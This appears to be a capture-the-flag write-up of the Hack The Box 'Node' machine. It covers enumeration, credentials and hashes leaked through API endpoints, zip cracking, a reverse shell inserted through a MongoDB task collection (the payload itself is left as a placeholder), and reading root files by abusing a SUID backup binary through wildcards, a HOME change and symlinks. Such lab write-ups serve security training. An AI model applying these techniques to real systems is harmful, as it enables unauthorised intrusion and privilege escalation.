# Node

Difficulty: 5
Key takeway: use backup program and evasive techniques to archive and retrieve the contents of a forbidden directory
Tags: Hadoop, JS, Linux Priv Esc, Web
Type: Linux

# Enumeration

portscan 

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-11 07:46 EDT
Nmap scan report for node.htb (10.10.10.58)
Host is up (0.20s latency).

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.71 seconds
```

- dir scan doesn't reveal any helpful information
- Found a js file with some api endpoints

```json
# /api/users/latest
[
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

Found admin credentials in another js file (/api/users)

`myP14ceAdm1nAcc0uNT:manchester`

- logged in as admin and downloaded the backup file
- the backup file is encoded after decoding → file decoded-myplace.backup is a password protected zip file
- using `frcrackzip` to brute force passwords on the zip file

found creds for `mark` in app.js(var/www/myplace/ → mongodb url) 

mark:5AYRft73VtFpc84k

# Initial Access

used these creds to log into ssh 

mongo was running on port 27017 → netstat -ant 

connected to mongo with mark's creds

since app.js was compiled after a certain fixed period of time anything inside the database was executed and wiped off

so I inserted a python reverse shell in the database

```bash
mongo -u mark -p pasword localhost:27017/<database_name> 

>show collections 
tasks
>db.tasks.insert({ cmd: "<python one-liner reveres shell here>" })
```

# Privilege Escalation

noticed that a SUID /usr/local/bin/backup is also used in app.js

- decode the files to get a compressed ZIP file
- decompress the compressed files using 7z
- do this for /root directory using wildcards

```bash
/usr/local/bin/backup -q <backup_key> /r**t/r**t.txt > root 
```

Alternate method 

- set HOME=/root
- then backup "~"

Another method 

- using symlinks

```bash
tom@node:/tmp$ mkdir altdir
tom@node:/tmp$ cd altdir/
tom@node:/tmp/altdir$ ln -s /root/root.txt altfile
```

```bash
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/altdir
```

## Notes

-